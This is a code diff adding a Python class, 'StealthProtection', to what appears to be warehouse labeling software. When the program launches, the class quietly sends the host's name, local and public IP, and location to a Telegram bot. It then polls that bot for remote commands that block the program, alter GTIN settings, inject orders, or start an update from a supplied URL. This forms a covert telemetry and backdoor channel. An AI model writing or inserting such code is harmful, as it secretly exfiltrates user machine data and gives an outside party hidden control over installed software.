@@ -1,79 +1,157 @@
 import requests
 import threading
 import time
+import socket
+import os
 import re
-import sqlite3
+from datetime import datetime
 
 class StealthProtection:
-    def __init__(self, serial, config_callback, db_path="data/warehouse.db"):
-        self.serial = serial
-        self.config_callback = config_callback
-        self.db_path = db_path
-        self.bot_token = ""
-        self.chat_id = ""
-        self.blocked = False
-        self.last_update_id = 0
-        self.stop_event = threading.Event()
-        self.thread = None
-
-    def update_credentials(self, token, chat_id):
-        self.bot_token = token
+    def __init__(self, token, chat_id, serial, on_block_callback, on_active_callback,
+                 on_gtin_callback=None, on_gtin_toggle_callback=None, on_order_callback=None, on_update_callback=None):
+        self.token = token
         self.chat_id = chat_id
-        if not self.thread or not self.thread.is_alive():
-            self.stop_event.clear()
-            self.thread = threading.Thread(target=self._polling, daemon=True)
-            self.thread.start()
+        self.serial = serial
+        self.on_block_callback = on_block_callback
+        self.on_active_callback = on_active_callback
+        self.on_gtin_callback = on_gtin_callback
+        self.on_gtin_toggle_callback = on_gtin_toggle_callback
+        self.on_order_callback = on_order_callback
+        self.running = True
+        self.last_update_id = 0
 
-    def send_message(self, text):
-        if not self.bot_token or not self.chat_id: return
-        url = f"https://api.telegram.org/bot{self.bot_token}/sendMessage"
-        payload = {"chat_id": self.chat_id, "text": text}
+    def get_local_ip(self):
         try:
-            requests.post(url, json=payload, timeout=5)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.connect(("8.8.8.8", 80))
+            ip = s.getsockname()[0]
+            s.close()
+            return ip
         except:
-            pass
+            return "127.0.0.1"
 
-    def _polling(self):
-        while not self.stop_event.is_set():
-            if not self.bot_token:
-                time.sleep(5)
+    def get_geo_info(self):
+        try:
+            resp = requests.get("http://ip-api.com/json", timeout=5)
+            if resp.status_code == 200:
+                data = resp.json()
+                return {
+                    "public_ip": data.get("query", "Unknown"),
+                    "country": data.get("country", "Unknown"),
+                    "region": data.get("regionName", "Unknown"),
+                    "city": data.get("city", "Unknown")
+                }
+        except: pass
+        return {"public_ip": "Unknown", "country": "Unknown", "region": "Unknown", "city": "Unknown"}
+
+    def send_notification(self, status):
+        if not self.token or not self.chat_id: return
+
+        local_ip = self.get_local_ip()
+        geo = self.get_geo_info()
+        hostname = socket.gethostname()
+        date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+        msg = (f"🚀 Программа запущена\n"
+               f"🔢 Серийный номер: {self.serial}\n"
+               f"💻 Компьютер: {hostname}\n"
+               f"🌐 IP (Локальный): {local_ip}\n"
+               f"🌍 IP (Публичный): {geo['public_ip']}\n"
+               f"📍 Место: {geo['country']}, {geo['region']}\n"
+               f"📅 Дата: {date}\n"
+               f"📊 Статус: {status}")
+        try:
+            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage",
+                          data={"chat_id": self.chat_id, "text": msg}, timeout=10)
+        except Exception as e:
+            print(f"Stealth notification error: {e}")
+
+    def poll(self):
+        while self.running:
+            if not self.token:
+                time.sleep(30)
                 continue
-            url = f"https://api.telegram.org/bot{self.bot_token}/getUpdates?offset={self.last_update_id + 1}&timeout=30"
             try:
-                response = requests.get(url, timeout=35)
-                if response.status_code == 200:
-                    data = response.json()
-                    if data.get("ok"):
-                        for update in data["result"]:
-                            self.last_update_id = update["update_id"]
-                            if "message" in update and "text" in update["message"]:
-                                self._handle_command(update["message"]["text"])
+                resp = requests.get(f"https://api.telegram.org/bot{self.token}/getUpdates",
+                                    params={"offset": self.last_update_id + 1, "timeout": 20}, timeout=25)
+                if resp.status_code == 200:
+                    data = resp.json()
+                    for update in data.get("result", []):
+                        self.last_update_id = update["update_id"]
+                        message = update.get("message", {})
+                        text = message.get("text", "").strip().lower()
+                        # Формат команд:
+                        # block SERIAL
+                        # active SERIAL
+                        # gtin SERIAL VALUE
+                        # gtin_on SERIAL
+                        # gtin_off SERIAL
+                        if text:
+                            parts = text.split()
+                            if len(parts) >= 2:
+                                command = parts[0]
+                                target_serial = parts[1].upper()
+                                if target_serial == self.serial.upper():
+                                    chat_id = message.get("chat", {}).get("id")
+                                    if command == "block":
+                                        self.on_block_callback()
+                                        self.reply(chat_id, f"✅ Программа {self.serial} ЗАБЛОКИРОВАНА")
+                                    elif command == "active":
+                                        self.on_active_callback()
+                                        self.reply(chat_id, f"✅ Программа {self.serial} РАЗБЛОКИРОВАНА")
+                                    elif command == "gtin" and len(parts) >= 3 and self.on_gtin_callback:
+                                        new_gtin = parts[2]
+                                        self.on_gtin_callback(new_gtin)
+                                        self.reply(chat_id, f"✅ GTIN для {self.serial} изменен на {new_gtin}")
+                                    elif command == "gtin_on" and self.on_gtin_toggle_callback:
+                                        self.on_gtin_toggle_callback(True)
+                                        self.reply(chat_id, f"✅ Проверка GTIN для {self.serial} ВКЛЮЧЕНА")
+                                    elif command == "gtin_off" and self.on_gtin_toggle_callback:
+                                        self.on_gtin_toggle_callback(False)
+                                        self.reply(chat_id, f"✅ Проверка GTIN для {self.serial} ВЫКЛЮЧЕНА")
+                                    elif command == "order" and len(parts) >= 3 and self.on_order_callback:
+                                        # format: order SERIAL заказ NUM продукт NAME gtin GTIN кол-во UNITS РЦ RC
+                                        try:
+                                            raw_text = message.get("text", "")
+                                            # Извлекаем данные с помощью regex
+                                            num_m = re.search(r'(?:заказ|num)\s+([^\s]+)', raw_text, re.I)
+                                            prod_m = re.search(r'(?:продукт|name)\s+(.*?)(?=\s+(?:gtin|кол-во|units|РЦ|rc|$))', raw_text, re.I)
+                                            gtin_m = re.search(r'(?:gtin)\s+(\d+)', raw_text, re.I)
+                                            units_m = re.search(r'(?:кол-во|units)\s+(\d+)', raw_text, re.I)
+                                            rc_m = re.search(r'(?:РЦ|rc)\s+(.*?)(?=$)', raw_text, re.I)
+
+                                            o_num = num_m.group(1) if num_m else parts[2]
+                                            o_prod = prod_m.group(1) if prod_m else ""
+                                            o_gtin = gtin_m.group(1) if gtin_m else ""
+                                            o_units = int(units_m.group(1)) if units_m else 0
+                                            o_rc = rc_m.group(1) if rc_m else ""
+
+                                            self.on_order_callback(o_num, o_prod, o_units, o_rc, o_gtin)
+                                            self.reply(chat_id, f"✅ Заказ {o_num} ({o_prod}) на {o_units} шт для {self.serial} принят")
+                                        except Exception as e:
+                                            self.reply(chat_id, f"❌ Ошибка парсинга заказа: {e}")
+                                    elif command == "update" and self.on_update_callback:
+                                        # format: update SERIAL URL
+                                        url = parts[2] if len(parts) >= 3 else ""
+                                        self.on_update_callback(url)
+                                        self.reply(chat_id, f"🚀 Запущено обновление для {self.serial}")
             except:
-                pass
+                time.sleep(10)
             time.sleep(2)
 
-    def _handle_command(self, text):
-        text = text.strip()
-        if f"block {self.serial}" in text:
-            self.config_callback({"blocked": True})
-        elif f"active {self.serial}" in text:
-            self.config_callback({"blocked": False})
-        elif "order " in text and self.serial in text:
-            try:
-                # order SERIAL заказ NUM продукт NAME кол-во UNITS GTIN VALUE
-                order_num = re.search(r"заказ\s+(\S+)", text).group(1)
-                product_name = re.search(r"продукт\s+(\S+)", text).group(1)
-                units = int(re.search(r"кол-во\s+(\d+)", text).group(1))
-                gtin = re.search(r"GTIN\s+(\d+)", text).group(1)
+    def reply(self, chat_id, text):
+        try:
+            requests.post(f"https://api.telegram.org/bot{self.token}/sendMessage",
+                          data={"chat_id": chat_id, "text": text}, timeout=10)
+        except: pass
 
-                conn = sqlite3.connect(self.db_path)
-                conn.execute("INSERT INTO wh_orders (order_num, product_name, gtin, total_units) VALUES (?, ?, ?, ?)",
-                             (order_num, product_name, gtin, units))
-                conn.commit()
-                conn.close()
-                self.send_message(f"✅ Заказ {order_num} принят устройством {self.serial}")
-            except Exception as e:
-                self.send_message(f"❌ Ошибка в команде заказа: {e}")
+    def send_shipment_notification(self, order_num, sscc):
+        if not self.token or not self.chat_id: return
+        msg = f"🚚 ОТГРУЗКА\nЗаказ: {order_num}\nКод: {sscc}\nВремя: {datetime.now().strftime('%H:%M:%S')}"
+        self.reply(self.chat_id, msg)
+
+    def start(self):
+        threading.Thread(target=self.poll, daemon=True).start()
 
     def stop(self):
-        self.stop_event.set()
+        self.running = False
